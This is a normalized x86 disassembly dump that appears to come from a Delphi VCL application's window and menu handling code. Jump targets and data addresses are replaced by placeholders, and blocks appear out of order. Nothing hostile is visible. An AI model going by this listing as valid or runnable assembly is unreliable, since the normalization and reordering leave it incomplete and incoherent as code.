mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_459a2c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_458454
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_459930
pop ecx
sub_459a60
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43f850
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_444968
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_444968
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_444968
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43e7f4
pop esi
pop ebx
retn
sub_459af0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_444968
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_443bbc
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_444968
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_451f64
sub_459b50
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_442c58
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_451978
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_459b9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_4521d8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_459bd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_459c6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459c76
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_4518d8
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e990
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43b25c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e990
jmp r-xdata
sub_459c9c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_40348c
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_459cdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c94c
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_459d08
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4594c8
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43b034
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_459d60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_443aa0
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45d344
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_459dec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_444968
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_444968
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_444968
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_459e84
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_444968
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_459464
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_40348c
sub_459edc
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_444e9c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_459f08
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4594c8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_459f24
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_451908
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_451908
sub_459f64
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_459f9c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_404034
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_459fd0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45a121
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a128
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_459f24
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43afd8
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412618
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43dc64
lea eax [ ebp - 0x1c ]
call sub_406a10
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_459f24
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_459f64
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45e634
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45e69c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45e69c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_459f9c
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412618
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43dc64
lea eax [ ebp - 0x1c ]
call sub_406a10
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45e5cc
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45a130
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45a1a4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45a1d0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442f04
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4581e0
lea edx [ ebp - 0x14 ]
call sub_45b9a8
push ebp
mov eax [ ebp - 0x4 ]
call sub_4581e0
lea edx [ ebp - 0x24 ]
call sub_45b9a8
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45a1a4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4581e0
lea edx [ ebp - 0x24 ]
call sub_45b9a8
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45a1a4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45a1a4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45a1a4
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45a288
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40348c
pop esi
pop ebx
retn
sub_45a2ac
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_40348c
pop esi
pop ebx
retn
sub_45a2d0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_443de4
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_444e9c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_444e9c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45a36c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a8d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45ea80
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45a8b9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a8c0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
push ebp
push sub_45a7c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_403730#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459518
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441ec0
jmp r-xdata
mov eax [ rw-data ]
call sub_45bc04
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_444968
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45bbf8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_444968
call sub_45517c
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45bc34
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45bc04
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43e3ac
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45bc28
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45bbf8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4587c8
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4587c8
jmp r-xdata
sub_45a429
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e194
call sub_403a98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45bc04
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45bbf8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45bc34
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45bc04
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
